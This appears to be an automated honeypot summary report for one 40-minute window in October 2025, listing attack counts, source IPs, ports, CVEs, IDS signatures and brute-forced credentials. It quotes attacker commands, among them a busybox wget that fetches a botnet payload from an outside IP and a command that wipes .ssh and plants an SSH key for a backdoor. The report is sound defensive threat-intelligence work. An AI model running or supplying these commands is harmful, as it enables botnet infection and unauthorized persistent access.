Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-15T22:01:30Z
**Timeframe:** 2025-10-15T21:20:01Z to 2025-10-15T22:00:01Z
**Files:** agg_log_20251015T212001Z.json, agg_log_20251015T214001Z.json, agg_log_20251015T220001Z.json

**Executive Summary:**
This report summarizes 28,639 attacks recorded by honeypots. The most targeted services were Cowrie (SSH/Telnet), Dionaea (SMB/FTP), and Honeytrap. A significant portion of attacks originated from IP addresses 152.70.144.244, 188.246.224.87 and 171.225.205.126. The most frequently targeted ports were 445 (SMB) and 5060 (SIP). Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most common. Attackers attempted a variety of commands, primarily focused on reconnaissance and establishing persistent access.

**Detailed Analysis:**

***Attacks by Honeypot:***
*   Cowrie: 8235
*   Dionaea: 5410
*   Honeytrap: 5569
*   Suricata: 4414
*   Sentrypeer: 3321
*   Ciscoasa: 1467
*   H0neytr4p: 59
*   Tanner: 49
*   Redishoneypot: 31
*   Mailoney: 33
*   ElasticPot: 13
*   Honeyaml: 14
*   Adbhoney: 8
*   Ipphoney: 9
*   Dicompot: 3
*   ConPot: 3
*   Medpot: 1

***Top Attacking IPs:***
*   152.70.144.244: 2526
*   188.246.224.87: 2519
*   105.96.9.30: 2136
*   171.225.205.126: 1355
*   206.191.154.180: 1239
*   185.243.5.121: 1070
*   23.94.26.58: 751
*   68.233.116.124: 619
*   172.86.95.115: 569
*   223.17.0.220: 484
*   14.18.113.233: 395
*   172.86.95.98: 436
*   139.59.24.22: 483
*   130.250.189.166: 468
*   190.34.200.34: 281
*   51.68.199.166: 262
*   40.74.115.25: 236
*   36.66.16.233: 231
*   185.255.91.28: 222
*   202.179.31.242: 680

***Top Targeted Ports/Protocols:***
*   445: 5360
*   5060: 3321
*   22: 1014
*   TCP/445: 1351
*   TCP/5900: 194
*   5903: 201
*   8333: 89
*   5901: 103
*   UDP/5060: 83
*   443: 67
*   23: 63
*   80: 51
*   1577: 160
*   4443: 41
*   TCP/22: 19
*   TCP/1577: 17

***Most Common CVEs:***
*   CVE-2002-0013
*   CVE-2002-0012
*   CVE-1999-0517

***Commands Attempted by Attackers:***
*   cd ~; chattr -ia .ssh; lockr -ia .ssh
*   lockr -ia .ssh
*   cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."
*   cat /proc/cpuinfo | grep name | wc -l
*   cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
*   free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
*   ls -lh $(which ls)
*   which ls
*   crontab -l
*   w
*   uname -m
*   cat /proc/cpuinfo | grep model | grep name | wc -l
*   top
*   uname
*   uname -a
*   whoami
*   lscpu | grep Model
*   df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
*   Enter new UNIX password:

***Signatures Triggered:***
*   ET SCAN MS Terminal Server Traffic on Non-standard Port
*   ET HUNTING RDP Authentication Bypass Attempt
*   ET DROP Dshield Block Listed Source group 1
*   ET SCAN NMAP -sS window 1024
*   ET INFO Reserved Internal IP Traffic
*   ET CINS Active Threat Intelligence Poor Reputation IP group 43
*   ET CINS Active Threat Intelligence Poor Reputation IP group 48
*   ET VOIP Modified Sipvicious Asterisk PBX User-Agent
*   ET VOIP Possible Inbound VOIP Scan/Misuse With User-Agent Zoiper
*   ET INFO CURL User Agent
*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 42
*   ET DROP Spamhaus DROP Listed Traffic Inbound group 41
*   ET SCAN Potential SSH Scan
*   ET CINS Active Threat Intelligence Poor Reputation IP group 49
*   ET CINS Active Threat Intelligence Poor Reputation IP group 47

***Users / Login Attempts:***
*   345gs5662d34/345gs5662d34
*   root/Qaz123qaz
*   root/3245gs5662d34
*   root/QWE123!@#qwe
*   ftpuser/ftppassword
*   shahid/shahid123
*   apps/123
*   root/123@@@
*   centos/123123
*   george/george
*   supervisor/supervisor333
*   user4/user4
*   test/password1
*   samba/123
*   samba/3245gs5662d34
*   es/es123
*   omid/omid
*   root/hz@123456
*   root/12312311.!

***Files Uploaded/Downloaded:***
*   Mozi.a+varcron
*   11
*   fonts.gstatic.com
*   css?family=Libre+Franklin...
*   ie8.css?ver=1.0
*   html5.js?ver=3.7.3
*   )
*   arm.urbotnetisass;
*   arm.urbotnetisass
*   arm5.urbotnetisass;
*   arm5.urbotnetisass
*   arm6.urbotnetisass;
*   arm6.urbotnetisass
*   arm7.urbotnetisass;
*   arm7.urbotnetisass
*   x86_32.urbotnetisass;
*   x86_32.urbotnetisass
*   mips.urbotnetisass;
*   mips.urbotnetisass
*   mipsel.urbotnetisass;
*   mipsel.urbotnetisass

***HTTP User-Agents:***
*   (No data)

***SSH Clients:***
*   (No data)

***SSH Servers:***
*   (No data)

***Top Attacker AS Organizations:***
*   (No data)

**Key Observations and Anomalies:**
*   A notable command `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` was observed, indicating attempts to download and execute malicious payloads for various architectures (ARM, x86, MIPS). This is characteristic of botnet propagation.
*   The repeated command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` suggests a campaign to inject SSH keys for persistent backdoor access.
*   The high number of events related to SMB (port 445) and the "DoublePulsar" signature suggest ongoing exploitation attempts related to the EternalBlue vulnerability.

This concludes the Honeypot Attack Summary Report.